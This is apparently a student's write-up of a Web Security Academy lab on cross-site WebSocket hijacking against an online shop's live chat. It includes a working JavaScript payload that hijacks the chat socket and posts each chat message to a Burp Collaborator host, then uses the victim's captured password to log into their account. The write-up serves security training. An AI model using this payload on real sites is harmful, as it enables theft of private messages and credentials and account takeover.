# Lab: Cross-site WebSocket hijacking

 This online shop has a live chat feature implemented using WebSockets.

To solve the lab, use the exploit server to host an HTML/JavaScript payload that uses a cross-site WebSocket hijacking attack to exfiltrate the victim's chat history, then use this gain access to their account. 

**Note**
To prevent the Academy platform being used to attack third parties, our firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, you must use the provided exploit server and/or Burp Collaborator's default public server. 


# Step 1 Find that the websocket handshake has no CSRF protection

I see that the websocket handshake has no CSRF protection:

![image](https://user-images.githubusercontent.com/83407557/213182437-3492ae03-86ae-4f1c-804b-3644307e61f8.png)

I also see that after the "READY" message is sent to the server, my full chat history is returned to my client:

![image](https://user-images.githubusercontent.com/83407557/213182921-ac494884-8f65-431b-aacf-fe4801a09dd1.png)


# Step 2 Creat a POC

First I want to get my burp collaborator URL:

![image](https://user-images.githubusercontent.com/83407557/213183079-15454649-6bba-4663-ab53-cef47dcd1b8d.png)

```
dn4npn1rpbdi72uubz3v15sqkhq8ey2n.oastify.com
```

Next I need to copy the handshake URL from the target site

```
https://0a9400f7037ab399c0e3d69a00a40051.web-security-academy.net/chat
```

Then finally I want to create a script that will capture the handshake and send my collaborator POST requests for each of the chat history messages that are being sent to the client:(note I change the handshake url from https to wss in order to use the websocket protocol:

```html
<script>
    var ws = new WebSocket('wss://0a9400f7037ab399c0e3d69a00a40051.web-security-academy.net/chat');
    ws.onopen = function() {
        ws.send("READY");
    };
    ws.onmessage = function(event) {
        fetch('https://dn4npn1rpbdi72uubz3v15sqkhq8ey2n.oastify.com', {method: 'POST', mode: 'no-cors', body: event.data});
    };
</script>
```

# Step 3 Test that the POC is working by capturing my own chat history

I POST the POC on my attack-server:

![image](https://user-images.githubusercontent.com/83407557/213184445-8ba086ff-5cd7-4122-ae3f-06fc0c50b189.png)

I then click on view exploit, to simulate a victim clicking on the link, and see the POST requests going through my http history in burp:

![image](https://user-images.githubusercontent.com/83407557/213184877-3a0b23f3-5f30-46b4-8e72-df1e336381b3.png)

In Collaborator I also see that I have gotten my full chat history via POST requests:

![image](https://user-images.githubusercontent.com/83407557/213185143-53f8b749-3db4-4ea5-9357-84f3b155a150.png)


# Step 4 Send Exploit to victim:

Back on my attack server I click Deliver exploit to victim, to simulate sending the victim a malicious link:

![image](https://user-images.githubusercontent.com/83407557/213185372-6390457e-d4ae-41f3-9cd9-ec284f485804.png)

# Step 5 Poll Collaborator

I see a POST request from the victim asking about their password:

![image](https://user-images.githubusercontent.com/83407557/213185892-fe925a5f-b252-43bf-abfc-1875202dd1cc.png)

And a POST request containing the password, as well as the username:

![image](https://user-images.githubusercontent.com/83407557/213186175-327a1d71-8174-4938-9cb0-f7e944b43928.png)

# Step 6 Use found creds

Using the found credentials, I login to the victim's account:

![image](https://user-images.githubusercontent.com/83407557/213186485-c7690fb2-9343-4f21-bfca-fdb68fbd6a81.png)

(Note there is CSRF protection on the login page)

These creds get me into the victim's account:

![image](https://user-images.githubusercontent.com/83407557/213186716-6d57dd39-d087-48fe-94a9-fc912baa28b1.png)

Which Solves the lab:

![image](https://user-images.githubusercontent.com/83407557/213186804-755050eb-89e5-466d-a086-0f3a771bcf09.png)


